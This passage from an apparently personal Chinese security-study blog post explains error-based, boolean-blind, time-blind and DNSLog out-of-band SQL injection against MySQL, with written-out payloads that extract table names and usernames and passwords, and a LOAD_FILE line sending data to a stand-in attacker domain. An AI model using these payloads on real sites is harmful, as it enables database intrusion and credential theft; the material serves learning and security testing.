+<p>例如: updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema &#x3D; database() LIMIT 0,1),0x7e),1) ，由于第一个参数不符合要求而报错，在报错信息中可以获取数据库中的第一张表名，第三个参数1在这里无实际作用，因为函数会因为第一个参数不符合要求而报错。</p>
+<p><strong>3. <span style="color:red">SUBSTR()函数（或SUBSTRING()函数)</span></strong></p>
+<p>字符串截取函数。绕过字符串返回长度限制时使用。</p>
+<p>函数语法：<code>SUBSTR(str,pos,len)</code> 或 <code>SUBSTRING(str,pos,len)</code></p>
+<p>str 是要截取的字符串，可以是列名、函数返回的字符串等； pos 是开始截取的位置，从1开始计数（注意不是从0开始）,为正时从左往右数，为负时从右往左数； len 是要截取的长度；若没有给出len参数，则取到最后。</p>
+<p><strong>注意：在函数 substring(str,pos, len)中， pos 可以是负值，但 len 不能取负值</strong></p>
+<p>例如： SELECT SUBSTR(‘abcdef’,2,3) 会返回 bcd ，它从字符串 abcdef 的第二个位置开始，截取长度为3的子字符串。</p>
+<p><strong>4. <span style="color:red">LEFT()函数</span></strong></p>
+<p>字符串截取函数。从左边开始截取指定长度的字符串。</p>
+<p>函数语法： <code>LEFT(str,len)</code> </p>
+<p>例如： SELECT LEFT(‘abcdef’,3); 会返回 abc 。</p>
+<p><strong>5. <span style="color:red">RIGHT()函数</span></strong></p>
+<p>字符串截取函数。从右边开始截取指定长度的字符串。</p>
+<p>函数语法： <code>RIGHT(str,len)</code></p>
+<p>例如： SELECT RIGHT(‘abcdef’,2); 的结果是 ef 。</p>
+<p><strong>6. <span style="color:red">MID()函数</span></strong></p>
+<p>和SUBSTRING()函数类似，用于从指定位置开始提取子字符串。</p>
+<p>函数语法： <code>MID(str,start,length)</code> </p>
+<p>这里 str 是原始字符串， start 是开始位置， length 是要截取的长度。</p>
+<p>例如: SELECT MID(‘MySQL Tutorial’,7,7); 会返回 Tutorial 。</p>
+<p>步骤(以MySQL为例)</p>
+<p><strong>1. 寻找注入点</strong></p>
+<p><strong>2. 确定数据库类型及对应的报错函数和特性</strong></p>
+<p>MySQL数据库可以利用函数 extractvalue() 或者 updatexml() 来触发报错。如果我们故意构造错误的参数，就会引发报错。</p>
+<p>SQL Server数据库可以利用一些系统存储过程或者函数，比如 xp_cmdshell （如果启用），或者在执行除法运算时分母为0等操作来引发报错。在高版本的SQL Server中， xp_cmdshell 默认是禁用的。</p>
+<p><strong>3. 利用报错获取信息</strong></p>
+<p><strong>获取数据库名称</strong></p>
+<p>构造注入语句如 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND extractvalue(1,concat(0x7e,(database()),0x7e))</span><br></pre></td></tr></table></figure>
+
+<p>当执行这个语句时，由于 extractvalue() 函数的参数不符合要求，会引发报错，并且在报错信息中会包含数据库名称。</p>
+<p><strong>获取表名</strong></p>
+<p>构造语句 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))</span><br></pre></td></tr></table></figure>
+
+<p> 在报错信息中会显示第一张表的名称。</p>
+<p><strong>获取列名</strong></p>
+<p>以查询 users 表为例，可以构造语句 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name=&#x27;users&#x27; LIMIT 0,1),0x7e)) </span><br></pre></td></tr></table></figure>
+
+<p>在报错信息中获取列名。</p>
+<p><strong>获取数据内容</strong></p>
+<p>例如，要获取 users 表中的用户名，可以构造语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND extractvalue(1,concat(0x7e,(SELECT username FROM users LIMIT 0,1),0x7e))</span><br></pre></td></tr></table></figure>
+
+<p> 在报错信息中得到用户名相关内容。</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注时 <code>or</code> 和 <code>and</code> 可以根据闭合前面代码时的真假和页面的返回内容进行选择。</p>
+<h4 id="一、布尔盲注-回显不同"><a href="#一、布尔盲注-回显不同" class="headerlink" title="一、布尔盲注 - 回显不同"></a>一、布尔盲注 - 回显不同</h4><p>当页面返回结果只有两种状态（如正常显示和错误显示），并且无法直接获取数据库中的数据内容时使用。这种情况常见于网站对错误信息进行了隐藏或者统一处理，使得攻击者很难从页面直观地看到SQL查询的结果。例如，在一个搜索功能中，无论搜索结果是否存在，页面都只显示“未找到相关内容”或者正常的搜索结果，不会显示SQL错误。</p>
+<p>使用函数</p>
+<p><strong>1. <span style="color:red">SUBSTR()函数（或SUBSTRING()函数)</span></strong></p>
+<p>字符串截取函数。</p>
+<p>函数语法：<code>SUBSTR(str,pos,len)</code> 或 <code>SUBSTRING(str,pos,len)</code></p>
+<p>str 是要截取的字符串，可以是列名、函数返回的字符串等； pos 是开始截取的位置，从1开始计数（注意不是从0开始）,为正时从左往右数，为负时从右往左数； len 是要截取的长度；若没有给出len参数，则取到最后。</p>
+<p><strong>注意：在函数 substring(str,pos, len)中， pos 可以是负值，但 len 不能取负值</strong></p>
+<p>例如： SELECT SUBSTR(‘abcdef’,2,3) 会返回 bcd ，它从字符串 abcdef 的第二个位置开始，截取长度为3的子字符串。</p>
+<p><strong>2. <span style="color:red">ASCII()函数</span></strong></p>
+<p>函数语法：<code>ASCII(char)</code></p>
+<p>char 是要获取ASCII码的单个字符。</p>
+<p>例如： SELECT ASCII(‘a’) 会返回97，因为小写字母 a 的ASCII码是97。</p>
+<p><strong>3. <span style="color:red">LENGTH()&#x2F;LEN()函数</span></strong></p>
+<p>函数语法：LENGTH(str) </p>
+<p>用于计算字符串 str 的长度。</p>
+<p>例如： SELECT LENGTH(‘abc’) 返回3。</p>
+<p><strong>4. <span style="color:red">COUNT(*)函数</span></strong></p>
+<p>函数语法：<code> SELECT COUNT(*) FROM table_name WHERE condition</code></p>
+<p>在 SELECT 语句中使用。其中 table_name 是要查询的表名， condition 是筛选条件。</p>
+<p>例如： SELECT COUNT(*) FROM users WHERE age &gt; 20 会计算 users 表中年龄大于20的记录数量。</p>
+<p><strong>5. <span style="color:red">IF()函数</span></strong></p>
+<p>用于进行条件判断并返回不同的值。</p>
+<p>函数语法：<code>IF(condition,value_if_true,value_if_false)</code></p>
+<p> condition 是一个条件表达式， value_if_true 是条件为真时返回的值， value_if_false 是条件为假时返回的值。</p>
+<p>例如： SELECT IF(1 &gt; 0,’yes’,’no’) 返回 yes ，因为1大于0这个条件为真。</p>
+<p>步骤(以MySQL为例)</p>
+<p><strong>1. 判断注入点</strong></p>
+<p><strong>2. 确定数据库长度和名称</strong></p>
+<p>数据库长度：</p>
+<p>通过构造布尔表达式来判断数据库名称长度。例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (length(database()))=4</span><br></pre></td></tr></table></figure>
+
+<p> 不断改变等号后面的数字进行测试，直到页面返回正常结果，此时的数字就是数据库名称的长度。</p>
+<p>数据库名称：</p>
+<p>确定长度后，使用逐字符猜测的方法来获取数据库名称。从第一个字符开始，使用 ASCII 码（32~126）进行猜测。例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (ascii(substr(database(),1,1)))&gt;97 </span><br></pre></td></tr></table></figure>
+
+<p>通过不断调整比较的ASCII码值(可以使用二分法），当页面返回正常结果时，就可以确定第一个字符的ASCII码范围。重复这个过程，就可以逐个字符猜出数据库名称。</p>
+<p><strong>3. 获取表名相关信息</strong></p>
+<p>表的数量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select count(*) from information_schema.tables where table_schema=database())=3 </span><br></pre></td></tr></table></figure>
+
+<p>通改变等号后面的数字来猜测数据库中表的数量，直到页面返回正常结果。</p>
+<p>表名长度和名称：</p>
+<p>确定表的数量后，对于每一个表，用类似获取数据库名称的方法来获取表名长度和名称。例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5</span><br></pre></td></tr></table></figure>
+
+<p>  用于猜测第一张表的长度，然后通过逐字符猜测ASCII码来获取表名，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;97 </span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 获取列名相关信息</strong></p>
+<p>列的数量：</p>
+<p>以一张表为例（假设要查询 users 表的列数量）,可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select count(*) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=3 </span><br></pre></td></tr></table></figure>
+
+<p>通过改变等号后面的数字来猜测列数量，直到页面返回正常结果。</p>
+<p>列名长度和名称：</p>
+<p>确定列数量后，对于每一列，用类似获取表名的方法来获取列名长度和名称。例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ?id=1 and (length((select column_name from </span><br><span class="line"></span><br><span class="line">information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1))) = 4</span><br></pre></td></tr></table></figure>
+
+<p> 用于猜测第一列的长度，然后通过逐字符猜测ASCII码来获取列名，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ?id=1 and (ascii(substr((select column_name from information_schema.columns where </span><br><span class="line"></span><br><span class="line">table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1)))&gt;97</span><br></pre></td></tr></table></figure>
+
+<p><strong>5. 获取数据内容</strong></p>
+<p>以获取 users 表中的用户名和密码为例，可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (ascii(substr((select username from users limit 0,1),1,1)))&gt;97</span><br></pre></td></tr></table></figure>
+
+<p>来逐字符猜测用户名的第一个字符的ASCII码，重复这个过程获取完整用户名。然后用同样的方法获取密码等其他数据。</p>
+<h4 id="二、时间盲注-响应时间不同"><a href="#二、时间盲注-响应时间不同" class="headerlink" title="二、时间盲注 - 响应时间不同"></a>二、时间盲注 - 响应时间不同</h4><p>当布尔盲注无法有效判断时使用。比如页面对于不同的SQL查询结果都返回相同的正常页面，没有任何可以区分的反馈。同时，目标数据库支持可以产生时间延迟的函数（如MySQL中的 SLEEP() 函数）。例如，在一个新闻文章展示页面，无论文章是否存在，页面都正常加载一个默认的模板，没有任何可以用来判断注入是否成功的提示。</p>
+<p>使用函数</p>
+<p><strong>1. <span style="color:red">SLEEP()函数（MySQL）</span></strong></p>
+<p>函数语法：<code>SLEEP(seconds) </code></p>
+<p>seconds 表示延迟的秒数。</p>
+<p>例如: SLEEP(5) 会使SQL查询暂停5秒。</p>
+<p><strong>2. <span style="color:red">WAITFOR DELAY（SQL Server）</span></strong></p>
+<p>函数语法：<code>WAITFOR DELAY &#39;time&#39;</code> </p>
+<p>其中 time 是要延迟的时间，格式为 hh:mm:ss.mmm </p>
+<p>例如: WAITFOR DELAY ‘00:00:05’ 表示延迟5秒。</p>
+<p><strong>3. <span style="color:red">SUBSTR()函数（或SUBSTRING()函数)</span></strong></p>
+<p>字符串截取函数。</p>
+<p>函数语法：<code>SUBSTR(str,pos,len)</code> 或 <code>SUBSTRING(str,pos,len)</code></p>
+<p>str 是要截取的字符串，可以是列名、函数返回的字符串等； pos 是开始截取的位置，从1开始计数（注意不是从0开始）,为正时从左往右数，为负时从右往左数； len 是要截取的长度；若没有给出len参数，则取到最后。</p>
+<p><strong>注意：在函数 substring(str,pos, len)中， pos 可以是负值，但 len 不能取负值</strong></p>
+<p>例如： SELECT SUBSTR(‘abcdef’,2,3) 会返回 bcd ，它从字符串 abcdef 的第二个位置开始，截取长度为3的子字符串。</p>
+<p><strong>4. <span style="color:red">ASCII()函数</span></strong></p>
+<p>函数语法：<code>ASCII(char)</code></p>
+<p>char 是要获取ASCII码的单个字符。</p>
+<p>例如： SELECT ASCII(‘a’) 会返回97，因为小写字母 a 的ASCII码是97。</p>
+<p><strong>5. <span style="color:red">LENGTH()&#x2F;LEN()函数</span></strong></p>
+<p>函数语法：LENGTH(str) </p>
+<p>用于计算字符串 str 的长度。</p>
+<p>例如： SELECT LENGTH(‘abc’) 返回3。</p>
+<p><strong>6. <span style="color:red">IF()函数</span></strong></p>
+<p>用于进行条件判断并返回不同的值。</p>
+<p>函数语法：<code>IF(condition,value_if_true,value_if_false)</code></p>
+<p> condition 是一个条件表达式， value_if_true 是条件为真时返回的值， value_if_false 是条件为假时返回的值。</p>
+<p>例如： SELECT IF(1 &gt; 0,’yes’,’no’) 返回 yes ，因为1大于0这个条件为真。</p>
+<p>步骤(以MySQL为例)</p>
+<p><strong>1. 寻找注入点</strong></p>
+<p><strong>2. 确认数据库类型及支持的延迟函数</strong></p>
+<p>不同的数据库有不同的延迟函数，例如MySQL中有 SLEEP() 函数，SQL Server中有 WAITFOR DELAY 。通过页面返回的错误信息或者其他线索（如已知技术栈）来判断数据库类型，从而确定可以使用的延迟函数。</p>
+<p><strong>3. 利用时间延迟获取信息</strong></p>
+<p>获取数据库名称长度：</p>
+<p>构造注入语句如 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND IF((LENGTH(database())=4),SLEEP(5),1) </span><br></pre></td></tr></table></figure>
+
+<p>这里的 IF 函数用于条件判断，如果数据库名称长度等于4，就执行 SLEEP(5) 函数，使页面延迟5秒返回；如果长度不等于4，则返回1，页面正常返回。通过不断改变等号后面的数字来测试数据库名称长度，直到页面延迟返回，此时的数字就是数据库名称长度。</p>
+<p>获取数据库名称字符：</p>
+<p>确定长度后，逐字符获取数据库名称。从第一个字符开始，构造语句如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND IF((ASCII(SUBSTR(database(),1,1)))&gt;97,SLEEP(5),1)</span><br></pre></td></tr></table></figure>
+
+<p>通过不断调整比较的ASCII码值，当页面延迟返回时，就可以确定第一个字符的ASCII码范围。重复这个过程，就可以逐个字符猜出数据库名称。</p>
+<p><strong>获取表名相关信息</strong></p>
+<p>表的数量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=3,SLEEP(5),1) </span><br></pre></td></tr></table></figure>
+
+<p>通过改变等号后面的数字来猜测数据库中表的数量，直到页面延迟返回，就确定了表的数量。</p>
+<p>表名长度和名称：</p>
+<p>确定表的数量后，对于每一个表，用类似获取数据库名称的方法来获取表名长度和名称。例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND IF((LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))) = 5,SLEEP(5),1)</span><br></pre></td></tr></table></figure>
+
+<p> 用于猜测第一张表的长度，然后通过逐字符猜测ASCII码来获取表名，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND IF((ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)))&gt;97,SLEEP(5),1)</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取列名相关信息</strong></p>
+<p>列的数量：</p>
+<p>以一张表为例（假设要查询 users 表的列数量），可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name=&#x27;users&#x27;)=3,SLEEP(5),1)</span><br></pre></td></tr></table></figure>
+
+<p>通过改变等号后面的概率来猜测列数量，直到页面延迟返回，就确定了列数量。</p>
+<p>列名长度和名称：</p>
+<p>确定列数量后，对于每一列，用类似获取表名的方法来获取列名长度和名称。例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND IF((LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name=&#x27;users&#x27; LIMIT 0,1))) = 4,SLEEP(5),1)</span><br></pre></td></tr></table></figure>
+
+<p>用于猜测第一列的长度，然后通过逐字符猜测ASCII码来获取列名，如 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND IF((ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name=&#x27;users&#x27; LIMIT 0,1),1,1)))&gt;97,SLEEP(5),1)</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取数据内容</strong></p>
+<p>以获取 users 表中的用户名和密码为例，可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 AND IF((ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1)))&gt;97,SLEEP(5),1) </span><br></pre></td></tr></table></figure>
+
+<p> 来逐字符猜测用户名的第一个字符的ASCII码，重复这个过程获取完整用户名。然后用同样的方法获取密码等其他数据。</p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="DNSlog外带注入-只有数据库部署在win环境下可用"><a href="#DNSlog外带注入-只有数据库部署在win环境下可用" class="headerlink" title="DNSlog外带注入(只有数据库部署在win环境下可用)"></a>DNSlog外带注入(只有数据库部署在win环境下可用)</h3><p>一、DNSLog外带注入原理</p>
+<ol>
+<li>概述</li>
+</ol>
+<ul>
+<li>DNSLog外带注入是一种SQL注入攻击技术，主要用于盲注场景。在盲注中，攻击者无法直接从页面上获取注入结果（例如基于布尔的盲注中页面只返回True或False的结果，基于时间的盲注需要等待时间判断）。</li>
+<li>DNSLog利用了DNS（域名系统）协议的特性。当一个域名被查询时，DNS服务器会记录下查询请求，攻击者可以通过查看DNS服务器上的日志（DNSLog）来获取信息。</li>
+</ul>
+<ol start="2">
+<li>数据库与DNS交互原理</li>
+</ol>
+<ul>
+<li>在某些数据库系统中，存在一些函数可以发起网络请求，例如MySQL中的 LOAD_FILE() 函数和 SELECT… INTO OUTFILE 语句可以用来读取和写入文件， INET_ATON() 和 INET_NTOA() 函数用于IP地址和数字的转换。</li>
+<li>当结合数据库的网络请求函数和SQL注入漏洞时，攻击者可以构造恶意的SQL语句，让数据库去请求一个攻击者控制的域名。例如，在SQL注入点处构造语句让数据库查询 http:&#x2F;&#x2F;&lt;attacker - controlled - domain&gt;.com ，其中 &lt;attacker - controlled - domain&gt; 是攻击者控制的域名。</li>
+<li>数据库执行该查询时，会向DNS服务器请求解析这个域名，而攻击者可以通过查看DNS服务器上的请求日志（DNSLog）来获取数据库执行查询时的数据。</li>
+</ul>
+<p>二、DNSLog外带注入攻击步骤</p>
+<ol>
+<li>准备工作</li>
+</ol>
+<ul>
+<li>需要先注册一个域名，并设置好DNS服务器。例如，注册了 attacker - domain.com ，并配置了相应的DNS记录。</li>
+</ul>
+<ol start="2">
+<li>寻找SQL注入点</li>
+</ol>
+<ul>
+<li>通过手工测试或使用自动化工具（如SQLMap）寻找目标网站上的SQL注入点。这一步和常规的SQL注入检测方法类似，包括对数字型和字符型参数进行测试。例如，在一个URL参数 ?id&#x3D;1 处发现可能的注入点。</li>
+</ul>
+<ol start="3">
+<li>构造注入语句</li>
+</ol>
+<p>​	假设目标网站使用MySQL数据库，可以构造如下的注入语句：</p>
+<ul>
+<li><p>如果是基于 LOAD_FILE() 函数的外带：</p>
+<p>例如，<code>id=1 AND (SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT database()),&#39;.attacker - domain.com\\a.txt&#39;)))</code> 。</p>
+<p>这里 CONCAT 函数用于拼接字符串， LOAD_FILE 函数会尝试加载文件，在加载文件的过程中会触发对拼接域名的DNS查询。</p>
+</li>
+<li><p>如果是基于 SELECT… INTO OUTFILE 语句的外带：</p>
+<p>例如，<code>id=1 AND (SELECT * FROM users INTO OUTFILE &#39;/var/www/html/attacker - file.php&#39;)</code>，同时在自己的服务器上监听对 attacker - file.php 的请求，当数据库执行这条语句时，会尝试将数据写入文件，可以通过捕获对这个文件的请求获取数据。这种方法相对复杂，并且需要目标服务器有合适的文件写入权限。</p>
+</li>
+</ul>
+<ol start="4">
+<li>查看DNSLog获取数据</li>
+</ol>
+<ul>
+<li>在构造并发送注入语句后，到自己的DNSLog平台查看日志。如果注入成功，会在日志中看到数据库发起的DNS查询记录，从中可以提取出想要的信息，如数据库名、表名、列名甚至是敏感数据。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://vareca.me">Vareca</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://vareca.me/2025/02/21/SQL_injection/">https://vareca.me/2025/02/21/SQL_injection/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://vareca.me" target="_blank">Vareca</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8C%81%E7%BB%AD%E6%96%BD%E5%B7%A5%E4%B8%AD/">持续施工中</a></div><div class="post-share"><div class="social-share" data-image="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/Vareca.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/02/21/SQL_founction/" title="SQL注入常用MySQL函数"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">SQL注入常用MySQL函数</div></div><div class="info-2"><div class="info-item-1">SQL 注入攻击通过向应用程序提供恶意的 SQL 语句，企图操控数据库执行攻击者的命令。攻击者往往利用一些常见的 MySQL 函数来进行 SQL 注入，主要目的是绕过验证、提取敏感信息或破坏数据。以下是一些在 SQL 注入中常用的函数： 1.字符串函数 CONCAT(): 用于连接字符串。攻击者可以使用它来构造复杂的查询，拼接多条信息。  1SELECT CONCAT(username, &#x27;:&#x27;, password) FROM users;   CONCAT_WS(): 类似于 CONCAT()，但允许用指定的分隔符连接多个字符串。  1SELECT CONCAT_WS(&#x27;-&#x27;, id, username, email) FROM users;   CHAR(): 通过传递 ASCII 码来构造字符串，可以用来绕过过滤器。  12SELECT CHAR(117, 115, 101, 114);-- 返回 &#x27;user&#x27;   GROUP_CONCAT(): MySQL...</div></div></div></a><a class="pagination-related" href="/2025/02/21/sqlmap/" title="sqlmap指令"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">sqlmap指令</div></div><div class="info-2"><div class="info-item-1">一、目标-u  用途：指定目标URL，用于检测注入点。（url使用&#39;或&quot;包裹） 示例： sqlmap -u &quot;http://example.com/?id=1&quot; ，这将对给定的URL进行SQL注入检测。  -m  用途：用于批量扫描，指定包含多个目标URL的文件。 示例： sqlmap -m targets.txt ，其中 targets.txt 是一个包含多个URL的文本文件，每行一个URL。  -r  用途：用于从文件中读取HTTP请求（如POST请求）。通常用于处理通过Burp Suite等工具捕获并保存的请求。 示例： sqlmap -r request.txt ，其中 request.txt 是包含HTTP请求内容的文件。  --cookie  用途：用于进行cookie注入，即通过设置特定的cookie值来测试注入。 示例： sqlmap -u &quot;http://example.com/?id=1&quot; --cookie &quot;user=123&quot;...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/21/crypto/" title="CRYPT"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-21</div><div class="info-item-2">CRYPT</div></div><div class="info-2"><div class="info-item-1">密码学与隐写术不同，密码学隐藏的是信息的含义，不隐藏信息，而隐写术是隐藏信息 古典密码  凯撒密码 维吉尼亚密码 栅栏密码  现代密码  对称密码  DES  AES  RC4  SM4    非对称密码  RSA ECC ElGamal DSA ECD SA   哈希密码  MD5 SHA SHA-3 SM3    凯撒密码维吉尼亚密码栅栏密码DES加密原理DES算法属于对称加密中的分组加密算法 密钥长64位，56位参与运算，其余8位为校验位。（8，16，24，32，40，56，64） 当n个64位铭文数据块都经过DES加密处理后，所得到的n个64位密文数据块串在一起就是密文。 AES加密原理RC4SM4RSA 加密原理一、RSA 加密与解密过程RSA 是一种公钥加密算法，其核心在于利用模运算进行加密和解密操作，同时基于特定数学原理保证安全性。 1. 加密 将原始数据表示为一个数m（即原始信息），通过公钥(e, N)对其进行加密。加密公式为$$m^e\ mod\ N &#x3D; c$$其中e为公钥中的加密指数，N为一个大数，c为得到的密文。 2....</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://skymirror-1331175479.cos.ap-beijing.myqcloud.com/Vareca.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Vareca</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Vareca"><i class="fab fa-github"></i><span>My GitHub</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">CTF使我疯狂旋转!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">数据库基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E7%9A%84%E5%BA%93%EF%BC%9AInformation-schema%E5%BA%93"><span class="toc-number">1.0.1.</span> <span class="toc-text">重要的库：Information_schema库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.2.</span> <span class="toc-text">数据库命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Select%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.0.3.</span> <span class="toc-text">Select查询语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Insert%E6%8F%92%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.0.4.</span> <span class="toc-text">Insert插入语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Updata%E6%9B%B4%E6%96%B0%E6%93%8D%E4%BD%9C"><span class="toc-number">1.0.5.</span> <span class="toc-text">Updata更新操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Delet%E5%88%A0%E9%99%A4%E6%93%8D%E4%BD%9C"><span class="toc-number">1.0.6.</span> <span class="toc-text">Delet删除操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 